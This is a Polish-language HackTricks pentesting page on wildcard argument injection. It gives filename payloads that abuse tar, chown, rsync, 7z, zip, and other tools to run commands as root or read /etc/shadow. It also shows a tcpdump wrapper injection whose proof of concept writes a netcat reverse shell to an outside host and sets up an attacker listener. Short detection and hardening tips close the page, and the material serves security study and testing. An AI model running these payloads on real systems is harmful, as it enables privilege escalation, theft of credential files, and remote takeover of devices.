# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wstrzykiwanie **argumentów** z użyciem symboli wieloznacznych (znane również jako *glob*) ma miejsce, gdy skrypt z uprawnieniami uruchamia binarny program Unix, taki jak `tar`, `chown`, `rsync`, `zip`, `7z`, … z niecytowanym symbolem wieloznacznym, takim jak `*`.
> Ponieważ powłoka rozwija symbol wieloznaczny **przed** wykonaniem binarnego programu, atakujący, który może tworzyć pliki w katalogu roboczym, może stworzyć nazwy plików, które zaczynają się od `-`, aby były interpretowane jako **opcje zamiast danych**, skutecznie przemycając dowolne flagi lub nawet polecenia.
> Ta strona zbiera najbardziej przydatne prymitywy, najnowsze badania i nowoczesne wykrycia na lata 2023-2025.

## chown / chmod

Możesz **skopiować właściciela/grupę lub bity uprawnień dowolnego pliku** poprzez nadużycie flagi `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Kiedy root później wykonuje coś takiego:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` jest wstrzykiwane, co powoduje, że *wszystkie* pasujące pliki dziedziczą własność/uprawnienia z `/root/secret``file`.

*PoC & narzędzie*: [`wildpwn`](https://github.com/localh0t/wildpwn) (połączony atak).
Zobacz także klasyczny dokument DefenseCode dla szczegółów.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Wykonaj dowolne polecenia, nadużywając funkcji **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Gdy root uruchamia np. `tar -czf /root/backup.tgz *`, `shell.sh` jest wykonywany jako root.

### bsdtar / macOS 14+

Domyślny `tar` w najnowszym macOS (oparty na `libarchive`) *nie* implementuje `--checkpoint`, ale nadal możesz osiągnąć wykonanie kodu za pomocą flagi **--use-compress-program**, która pozwala na określenie zewnętrznego kompresora.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Kiedy skrypt z uprawnieniami uruchamia `tar -cf backup.tar *`, `/bin/sh` zostanie uruchomiony.

---

## rsync

`rsync` pozwala na nadpisanie zdalnego powłoki lub nawet zdalnego binarnego za pomocą flag wiersza poleceń, które zaczynają się od `-e` lub `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Jeśli root później archiwizuje katalog za pomocą `rsync -az * backup:/srv/`, wstrzyknięta flaga uruchamia twoją powłokę po stronie zdalnej.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Nawet gdy skrypt z uprawnieniami *defensywnie* poprzedza wildcard `--` (aby zatrzymać analizę opcji), format 7-Zip obsługuje **pliki listy plików** poprzez poprzedzenie nazwy pliku `@`. Łączenie tego z symlinkiem pozwala na *ekstrakcję dowolnych plików*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Jeśli root wykonuje coś takiego:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip spróbuje odczytać `root.txt` (→ `/etc/shadow`) jako listę plików i zakończy działanie, **drukując zawartość na stderr**.

---

## zip

`zip` obsługuje flagę `--unzip-command`, która jest przekazywana *dosłownie* do powłoki systemowej, gdy archiwum będzie testowane:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Wstrzyknij flagę za pomocą spreparowanej nazwy pliku i czekaj, aż skrypt kopii zapasowej z uprawnieniami wywoła `zip -T` (test archiwum) na wynikowym pliku.

---

## Dodatkowe binaria podatne na wstrzykiwanie dzikich kart (szybka lista 2023-2025)

Następujące polecenia były nadużywane w nowoczesnych CTF i rzeczywistych środowiskach. Payload jest zawsze tworzony jako *nazwa pliku* w zapisywalnym katalogu, który później będzie przetwarzany za pomocą dzikiej karty:

| Binary | Flag do nadużycia | Efekt |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → dowolny `@file` | Odczyt zawartości pliku |
| `flock` | `-c <cmd>` | Wykonaj polecenie |
| `git`   | `-c core.sshCommand=<cmd>` | Wykonanie polecenia przez git przez SSH |
| `scp`   | `-S <cmd>` | Uruchom dowolny program zamiast ssh |

Te prymitywy są mniej powszechne niż klasyki *tar/rsync/zip*, ale warto je sprawdzić podczas polowania.

---

## haki rotacji tcpdump (-G/-W/-z): RCE przez wstrzykiwanie argv w wrapperach

Gdy ograniczona powłoka lub wrapper dostawcy buduje linię poleceń `tcpdump` przez konkatenację pól kontrolowanych przez użytkownika (np. parametr "nazwa pliku") bez ścisłego cytowania/walidacji, możesz przemycić dodatkowe flagi `tcpdump`. Kombinacja `-G` (rotacja czasowa), `-W` (ograniczenie liczby plików) i `-z <cmd>` (polecenie po rotacji) prowadzi do dowolnego wykonania polecenia jako użytkownik uruchamiający tcpdump (często root na urządzeniach).

Warunki wstępne:

- Możesz wpływać na `argv` przekazywane do `tcpdump` (np. za pomocą wrappera takiego jak `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Wrapper nie oczyszcza spacji ani tokenów z prefiksem `-` w polu nazwy pliku.

Klasyczny PoC (wykonuje skrypt odwrotnego powłoki z zapisywalnej ścieżki):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` wymusza natychmiastową rotację po pierwszym pasującym pakiecie.
- `-z <cmd>` uruchamia polecenie po rotacji raz na rotację. Wiele wersji wykonuje `<cmd> <savefile>`. Jeśli `<cmd>` to skrypt/interpreter, upewnij się, że obsługa argumentów odpowiada twojemu ładunkowi.

No-removable-media variants:

- Jeśli masz jakąkolwiek inną metodę zapisu plików (np. osobny wrapper poleceń, który pozwala na przekierowanie wyjścia), umieść swój skrypt w znanej ścieżce i wywołaj `-z /bin/sh /path/script.sh` lub `-z /path/script.sh` w zależności od semantyki platformy.
- Niektóre wrappery dostawców rotują do lokalizacji kontrolowanych przez atakującego. Jeśli możesz wpłynąć na rotowaną ścieżkę (symlink/przechodzenie przez katalogi), możesz skierować `-z` do wykonania treści, którą w pełni kontrolujesz bez zewnętrznych nośników.

Hardening tips for vendors:

- Nigdy nie przekazuj ciągów kontrolowanych przez użytkownika bezpośrednio do `tcpdump` (lub jakiegokolwiek narzędzia) bez ścisłych list dozwolonych. Cytuj i waliduj.
- Nie ujawniaj funkcjonalności `-z` w wrapperach; uruchamiaj tcpdump z ustalonym bezpiecznym szablonem i całkowicie zabraniaj dodatkowych flag.
- Zmniejsz uprawnienia tcpdump (tylko cap_net_admin/cap_net_raw) lub uruchamiaj pod dedykowanym użytkownikiem bez uprawnień z ograniczeniem AppArmor/SELinux.

## Detection & Hardening

1. **Wyłącz globbing powłoki** w krytycznych skryptach: `set -f` (`set -o noglob`) zapobiega rozszerzaniu dzikich kart.
2. **Cytuj lub escape'uj** argumenty: `tar -czf "$dst" -- *` *nie* jest bezpieczne — preferuj `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Jawne ścieżki**: Używaj `/var/www/html/*.log` zamiast `*`, aby atakujący nie mogli tworzyć plików rodzeństwa, które zaczynają się od `-`.
4. **Najmniejsze uprawnienia**: Uruchamiaj zadania kopii zapasowej/konserwacyjne jako konto usługi bez uprawnień zamiast root, gdy to możliwe.
5. **Monitorowanie**: Wstępnie zbudowana reguła Elastic *Potencjalna powłoka przez wstrzyknięcie dzikiej karty* szuka `tar --checkpoint=*`, `rsync -e*` lub `zip --unzip-command` natychmiast po którym następuje proces potomny powłoki. Zapytanie EQL można dostosować do innych EDR-ów.

---

## References

* Elastic Security – Wykryta reguła Potencjalna powłoka przez wstrzyknięcie dzikiej karty (ostatnia aktualizacja 2025)
* Rutger Flohil – “macOS — Wstrzyknięcie dzikiej karty tar” (18 grudnia 2024)
* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
* FiberGateway GR241AG – [Pełny łańcuch exploitów](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
